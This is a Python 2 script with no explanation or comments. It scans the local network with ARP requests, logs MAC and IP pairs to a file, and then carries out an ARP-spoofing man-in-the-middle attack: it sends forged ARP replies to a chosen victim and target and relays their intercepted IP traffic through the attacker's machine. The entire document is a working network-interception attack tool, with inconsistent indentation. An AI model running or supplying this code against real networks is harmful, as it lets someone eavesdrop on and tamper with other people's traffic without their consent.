import socket, struct, string, multiprocessing, os, fcntl

def recv_s():
	a=get_my_add()
	sock=socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
	while True:
		f=open("akasha.txt",'a+')
		packet=sock.recvfrom(42)
    		ethr=packet[0][0:14]
    		eth=struct.unpack("!6s6s2s",ethr)
    		ethertype=eth[2]
    		arpr=packet[0][14:42]
    		arp=struct.unpack("!2s2sss2s6s4s6s4s",arpr)
    		if ethertype != '\x08\x06': continue
    		if arp[4]!='\x00\x02': continue
		vird=[]
		for i in range(6): vird.append(ord(eth[0][i]))
		if cmp(vird, a[1])!=0: continue
		for i in range(6): f.write(hex(ord(arp[5][i])))
		f.write("\n")
		for i in range(4): f.write(hex(ord(arp[6][i])))
		f.write("\n")
		f.close()

def recv_arp(a_ip,b_ip):
	a=get_my_add()
	a_mac=find_mac(a_ip)
	b_mac=find_mac(b_ip)
	for i in range(6): 
		a_mac[i]=int(a_mac[i], base=16)
		b_mac[i]=int(b_mac[i], base=16)
	sock=socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
	while True:
		packet=sock.recvfrom(42)
    		ethr=packet[0][0:14]
    		eth=struct.unpack("!6s6s2s",ethr)
    		ethertype=eth[2]
    		arpr=packet[0][14:42]
    		arp=struct.unpack("!2s2sss2s6s4s6s4s",arpr)
    		if ethertype != '\x08\x06': continue
    		if arp[4]!='\x00\x01': continue
		vird=[]
		axi=[]
		for i in range(6): 
			vird.append(ord(eth[0][i]))
			axi.append(ord(eth[1][i]))
		if cmp(vird, a[1])!=0: continue
		if cmp(axi,a_mac)==0:
			gsend_arp(a_mac,a_ip,b_ip)
		if cmp(axi,b_mac)==0:
			gsend_arp(b_mac,b_ip,a_ip)
			

def get_my_add():
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
   	my_ip=socket.inet_ntoa(fcntl.ioctl(s.fileno(),0x8915,struct.pack('256s', 'eth0'[:15]))[20:24])
	my_ip=my_ip.split(".")
	for i in range(4): my_ip[i]=int(my_ip[i])
	s.close()

	from uuid import getnode as get_mac
	mac = get_mac()
	my_mac=[]
	for i in range(1,7): my_mac.append(mac>>8*(6-i)&0xff)
	return [my_ip, my_mac]

def send_arp(src_mac, src_ip, dst_mac, dst_ip, opcode, n):
	sock=socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
	sock.bind(("eth0", 0))

	packet=""
	ETHERNET_FRAME=[	
     		struct.pack('!6B',dst_mac[0],dst_mac[1],dst_mac[2],dst_mac[3],dst_mac[4],dst_mac[5]), 
        	struct.pack('!6B',src_mac[0],src_mac[1],src_mac[2],src_mac[3],src_mac[4],src_mac[5]),	
       	struct.pack('!H',0x0806)
	]
	if opcode==2:
		ARP_FRAME=[
			struct.pack('!H', 0x0001),
			struct.pack('!H', 0x0800),
			struct.pack('!B', 0x06),
			struct.pack('!B', 0x04),
			struct.pack('!H', opcode),
			struct.pack('!6B',src_mac[0],src_mac[1],src_mac[2],src_mac[3],src_mac[4],src_mac[5]),	
			struct.pack('!4B',src_ip[0],src_ip[1],src_ip[2],src_ip[3]),					
			struct.pack('!6B',dst_mac[0],dst_mac[1],dst_mac[2],dst_mac[3],dst_mac[4],dst_mac[5]),	
			struct.pack('!4B',dst_ip[0],dst_ip[1],dst_ip[2],dst_ip[3])					
		]
	elif opcode==1:
		ARP_FRAME=[
			struct.pack('!H', 0x0001),
			struct.pack('!H', 0x0800),
			struct.pack('!B', 0x06),
			struct.pack('!B', 0x04),
			struct.pack('!H', opcode),
			struct.pack('!6B',src_mac[0],src_mac[1],src_mac[2],src_mac[3],src_mac[4],src_mac[5]),	
			struct.pack('!4B',src_ip[0],src_ip[1],src_ip[2],src_ip[3]),					
			struct.pack('!6B',0x00,0x00,0x00,0x00,0x00,0x00),	
			struct.pack('!4B',dst_ip[0],dst_ip[1],dst_ip[2],dst_ip[3])				
		]
	for i in range(0,3): packet+=ETHERNET_FRAME[i]
	for i in range(0,9): packet+=ARP_FRAME[i]
	for i in range(0,n): sock.send(packet)
	sock.close()

def gsend_arp(victim_mac, victim_ip, target_ip):
	a=get_my_add()
	send_arp(a[1], target_ip, victim_mac, victim_ip, 2, 3)

def scanner():
	t1=multiprocessing.Process(target=recv_s, args=())
	t1.start()
	a=get_my_add()
	br=[]
	z=[]
	k=[]
	for i in range(6): 
		br.append(0xff)
		z.append(0x00) 
	for i in range(4): k.append(a[0][i])
	k[3]=0
	for i in range(255): 
		send_arp(a[1], a[0], br, k, 1, 1)
		k[3]+=1
	t1.terminate()

def ssock(a_ip,b_ip):
	a_mac=find_mac(a_ip)
	for i in range(6): a_mac[i]=int(a_mac[i], base=16)
	gsend_arp(a_mac,a_ip,b_ip)
	b_mac=find_mac(b_ip)
	for i in range(6): b_mac[i]=int(b_mac[i], base=16)
	gsend_arp(b_mac,b_ip,a_ip)

def end():
	os.remove('./akasha.txt')

def print_mac():
	f=open('akasha.txt','r')
	c=0
	while True:
		c+=1
		mac=f.readline()
		ipp=f.readline()
		if not mac: break
		mac=mac.split("0x")
		for i in range(2,7): mac[i]=":"+mac[i]
		del mac[0]
		mac[5]=mac[5].replace("\n","")
		ipp=ipp.split("0x")
		for i in range(1,5): ipp[i]="."+str(int(ipp[i], base=16))
		ipp[1]=ipp[1].replace(".","")
		del ipp[0]
		ipp[3]=ipp[3].replace("\n","")
		print "#"+str(c)+" mac: "+"".join(mac)
		print ">> ip: "+"".join(ipp)
	f.close()

def find_mac(ip):
	ipo=[]
	for i in range(4): ipo.append(hex(ip[i]))
	f=open('akasha.txt','r')
	while True:
		mac=f.readline()
		ipp=f.readline()
		if not mac: break
		mac=mac.split("0x")
		for i in range(7): mac[i]="0x"+mac[i]
		del mac[0]
		mac[5]=mac[5].replace("\n","")
		ipp=ipp.split("0x")
		for i in range(5): ipp[i]="0x"+ipp[i]
		del ipp[0]
		ipp[3]=ipp[3].replace("\n","")
		if cmp(ipp,ipo)==0:
			return mac
			f.close()
	f.close()

def make_packet(packet, my_mac,src_mac,dst_mac, leng):
	rp="".join(packet)
	th=""
	ht=""
	for i in range(6): 
		th+=chr(my_mac[i])
		ht+=chr(dst_mac[i])
	for i in range(6): 
		th+=chr(src_mac[i])
		ht+=chr(my_mac[i])

	oo=rp.replace(th,ht)
	return oo

def tong(a_ip, b_ip):
	sock=socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
	sock.bind(("eth0", 0))
	while True:
		pocket=sock.recvfrom(65535)
		a_mac=find_mac(a_ip)
		b_mac=find_mac(b_ip)
		for i in range(6): a_mac[i]=int(a_mac[i], base=16)
		for i in range(6): b_mac[i]=int(b_mac[i], base=16)
		my_mac=get_my_add()[1]
 	   	ethr=pocket[0][0:14]
    		eth=struct.unpack("!6s6s2s",ethr)
		if eth[2]!='\x08\x00': continue

    		ipr=pocket[0][14:34]
    		ip=struct.unpack("!ss2s2s2sss2s4s4s",ipr)
		l=(ord(ip[2][0])<<8)+ord(ip[2][1])+14
		pvir=[]
		pvi=[]
		for i in range(4): pvi.append(ord(ip[9][i]))
		for i in range(4): pvir.append(ord(ip[8][i]))
		if cmp(a_ip,pvir)==0:
			pac=make_packet(pocket[0],my_mac,a_mac,b_mac,l)
			sock.send(pac)
		if cmp(a_ip,pvi)==0:
			pac=make_packet(pocket[0],my_mac,b_mac,a_mac,l)
			sock.send(pac)
	sock.close()

def arp_spoofing(a_ip, b_ip):
	ssock(a_ip,b_ip)
	p1=multiprocessing.Process(target=recv_arp, args=(a_ip,b_ip))
	p2=multiprocessing.Process(target=tong, args=(a_ip,b_ip))
	p1.start()
	p2.start()
	while True:
		if raw_input('if you want quit, press \'q\': ')=='q':
			p1.terminate()
			p2.terminate()
			break

scanner()
print "------------------------print arp table----------------------------"
print_mac()
print "------------------------print arp table----------------------------"
print
print "input victim and target ip"
print "ex) 8.8.8.8"
victim_ip=raw_input("victim ip: ")
victim_ip=victim_ip.split(".")
for i in range(4): victim_ip[i]=int(victim_ip[i])
target_ip=raw_input("target ip: ")
target_ip=target_ip.split(".")
for i in range(4): target_ip[i]=int(target_ip[i])
arp_spoofing(victim_ip,target_ip)
end()
print "spoofing is terminated!!"






